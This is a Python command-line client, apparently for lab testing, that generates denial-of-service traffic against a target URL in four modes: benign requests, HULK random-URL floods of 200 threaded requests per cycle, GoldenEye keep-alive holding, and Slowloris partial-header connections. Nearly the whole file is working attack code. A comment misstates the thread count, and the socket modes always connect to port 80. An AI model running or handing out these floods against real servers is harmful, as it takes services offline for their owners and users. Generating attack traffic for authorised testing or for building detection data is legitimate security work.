"""
Client for simulating different types of DoS attacks.

This script allows you to simulate various attack patterns on a target URL,
including benign traffic, HULK, GoldenEye, and Slowloris attacks.

Usage example from the command line:
    python client.py --type hulk --url http://192.168.1.140:8080 --duration 120

Arguments:
    --type      Type of attack to simulate. Options:
                  benign     - Normal benign traffic with 1 request/sec
                  hulk       - High concurrency random URL flooding
                  goldeneye  - Slow HTTP Keep-Alive connections
                  slowloris  - Slow headers HTTP connections
    --url       Target URL (e.g. http://192.168.1.140:8080)
    --duration  Duration in seconds (default: 60)

Requirements:
    - Python 3.x
    - requests module (pip install requests)

Note:
    Use responsibly and only against systems you own or have permission to test.

Author: Rafael Malla Martinez
Date: 2025-06-06
"""

import requests
import threading
import time

def benign_attack(target_url, duration):
    """Envía peticiones normales a ritmo constante."""
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            r = requests.get(target_url)
            print(f"[BENIGN] Status: {r.status_code}")
        except Exception as e:
            print(f"[BENIGN] Error: {e}")
        time.sleep(1)  # 1 petición por segundo

def hulk_attack(target_url, duration):
    """Envía muchas peticiones concurrentes con URLs aleatorias."""
    import random
    import string

    def send_request():
        rand_str = ''.join(random.choices(string.ascii_letters, k=8))
        try:
            r = requests.get(f"{target_url}/?{rand_str}")
            print(f"[HULK] Status: {r.status_code}")
        except Exception as e:
            print(f"[HULK] Error: {e}")

    end_time = time.time() + duration
    while time.time() < end_time:
        threads = []
        for _ in range(200):  # 50 peticiones concurrentes
            t = threading.Thread(target=send_request)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        # No delay para saturar al servidor

def goldeneye_attack(target_url, duration):
    """Simula GoldenEye: muchas conexiones HTTP Keep-Alive lentas."""
    import socket

    def attack():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_url.split("//")[1].split(":")[0], 80))
            sock.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n")
            while True:
                time.sleep(15)  # mantén conexión abierta enviando headers lentos
                sock.sendall(b"X-a: b\r\n")
        except:
            pass

    end_time = time.time() + duration
    threads = []
    for _ in range(100):  # 100 conexiones lentas simultáneas
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        threads.append(t)

    while time.time() < end_time:
        time.sleep(1)

def slowloris_attack(target_url, duration):
    """Simula Slowloris: abre conexiones HTTP y envía headers lentos."""
    import socket

    def attack():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target_url.split("//")[1].split(":")[0], 80))
            sock.sendall(b"GET / HTTP/1.1\r\n")
            while True:
                sock.sendall(b"X-a: b\r\n")
                time.sleep(15)
        except:
            pass

    end_time = time.time() + duration
    threads = []
    for _ in range(100):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        threads.append(t)

    while time.time() < end_time:
        time.sleep(1)

# Define más funciones para otros ataques...

def run_attack(attack_type, target_url, duration):
    if attack_type == "benign":
        benign_attack(target_url, duration)
    elif attack_type == "hulk":
        hulk_attack(target_url, duration)
    elif attack_type == "goldeneye":
        goldeneye_attack(target_url, duration)
    elif attack_type == "slowloris":
        slowloris_attack(target_url, duration)
    else:
        print(f"Ataque {attack_type} no implementado.")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Cliente modular para simular ataques.")
    parser.add_argument("--type", required=True, help="Tipo de ataque: benign, hulk, goldeneye, slowloris")
    parser.add_argument("--url", required=True, help="URL objetivo, ej: http://192.168.1.140:8080")
    parser.add_argument("--duration", type=int, default=60, help="Duración en segundos")

    args = parser.parse_args()
    run_attack(args.type.lower(), args.url, args.duration)
